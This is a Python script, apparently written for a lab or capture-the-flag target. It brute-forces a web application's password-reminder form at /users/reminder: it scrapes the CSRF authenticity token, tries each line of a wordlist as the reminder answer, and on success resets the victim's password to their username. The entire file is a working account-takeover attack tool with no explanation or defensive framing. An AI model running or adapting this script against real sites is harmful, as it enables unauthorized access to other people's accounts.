#!/usr/bin/env python3

import requests
import re
import sys

url = sys.argv[1]
username = sys.argv[2]
pwd_file = sys.argv[3]

s = requests.Session()
s.get(url)

def get_token(url):
    req = s.get(url + "/users/reminder")
    token = re.search(r'name="authenticity_token" value="(.*)"', str(req.text)).group(1)
    print("Using Token: ",token)
    return token

def brute_force(url, token):
    with open(pwd_file, 'r', encoding='iso-8859-1') as f:
        passwords = f.readlines()
        
        for password in passwords:
            password = password.strip()

            data = {
                'authenticity_token':token,
                'username':username,
                'reminder':password,
                'password':username
            }
            
            req = s.post(url + "/users/reminder", data=data, allow_redirects=True)
            print(f"\r\n[*] Trying reminder: {username}:{password}", end="")
            if "The password reminder doesn&#39;t match the records" in str(req.text):
                pass
            else:
                print(f"\n{username}:{password} worked as the reminder!\nResetting password...")
                print(f"\n[+] Successfull change the password: {username}:{username}!!!")
                sys.exit(0)

token = get_token(url)
brute_force(url, token)